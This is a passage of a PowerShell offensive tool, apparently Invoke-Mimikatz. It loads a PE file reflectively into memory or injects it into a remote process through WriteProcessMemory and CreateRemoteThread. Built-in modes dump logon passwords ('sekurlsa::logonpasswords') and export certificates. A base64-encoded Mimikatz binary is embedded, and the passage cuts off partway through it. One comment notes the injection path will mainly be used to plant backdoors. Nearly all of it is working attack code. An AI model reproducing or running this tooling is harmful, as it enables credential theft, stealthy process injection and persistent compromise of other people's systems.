		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        #Determine whether or not to use 32bit or 64bit bytes
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	

	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$ExeArgs = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    # SHA256 hash: 1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0
	# https://www.virustotal.com/en/file/1e67476281c1ec1cf40e17d7fc28a3ab3250b474ef41cb10a72130990f0be6a0/analysis/1450152636/
    $PEBytes64 = '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